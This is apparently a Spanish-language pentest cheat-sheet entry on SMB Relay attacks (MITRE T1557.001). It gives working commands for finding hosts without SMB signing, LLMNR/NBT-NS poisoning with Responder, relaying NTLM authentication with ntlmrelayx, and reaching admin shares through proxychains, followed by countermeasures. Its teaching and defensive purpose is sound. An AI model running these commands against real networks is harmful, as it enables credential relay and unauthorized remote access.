# SMB Relay Attack

## Descripción
Técnica de ataque de tipo Adversary-in-the-Middle (AiTM) donde un atacante intercepta una solicitud de autenticación SMB y la retransmite (relays) hacia otro servidor en la red. Si el usuario interceptado tiene privilegios administrativos en el destino, el atacante puede ejecutar comandos de forma remota (RCE) sin conocer la contraseña.

## Clasificación
- **Fase**: Explotación
- **MITRE ATT&CK**: T1557.001 (Adversary-in-the-Middle: LLMNR/NBT-NS Poisoning and SMB Relay)
- **Plataforma**: Red
- **Dificultad**: Avanzada

## Herramientas
- **ntlmrelayx.py** (`-t`, `-smb2support`, `-socks`) — parte de la suite Impacket, permite realizar el relay de hashes NTLM hacia múltiples protocolos.
- **Responder** (`-I`, `--rdmn`) — utilizado para envenenar LLMNR/NBT-NS y dirigir el tráfico hacia el atacante.
- **CrackMapExec** (`--gen-relay-list`) — para identificar objetivos con el firmado SMB (SMB Signing) desactivado.

## Comandos / Ejemplos

### Identificar objetivos sin firmado SMB
```bash
# Escanear la red para encontrar hosts vulnerables (SMB Signing: False)
cme smb 192.168.1.0/24 --gen-relay-list targets.txt
```

### Configurar Responder y ntlmrelayx
```bash
# 1. Configurar Responder.conf (desactivar SMB y HTTP)
sed -i 's/SMB = On/SMB = Off/' /etc/responder/Responder.conf
sed -i 's/HTTP = On/HTTP = Off/' /etc/responder/Responder.conf

# 2. Iniciar Responder para envenenamiento
sudo responder -I eth0 -rdw

# 3. Iniciar ntlmrelayx apuntando a los objetivos
sudo ntlmrelayx.py -tf targets.txt -smb2support -socks
```

### Ejecutar comandos mediante Relay
```bash
# Si se obtuvo una sesión exitosa, usar proxychains con las herramientas habituales
proxychains smbclient //192.168.1.50/C$ -U "DOMAIN/USER"
```

## Contramedidas
- Habilitar el firmado SMB (SMB Signing) de forma obligatoria en todos los hosts.
- Deshabilitar protocolos de resolución de nombres legados como LLMNR y NBT-NS.
- Implementar Seguridad de Capa de Red (IPsec) para proteger el tráfico interno.
- Restringir los privilegios de administrador local a cuentas estrictamente necesarias.

## Referencias
- Kim, P. (2018). *The Hacker Playbook 3*. Secure Planet, LLC.
- MITRE Corporation. (2024). ATT&CK Technique T1557.001: Adversary-in-the-Middle: LLMNR/NBT-NS Poisoning and SMB Relay. https://attack.mitre.org/techniques/T1557/001/
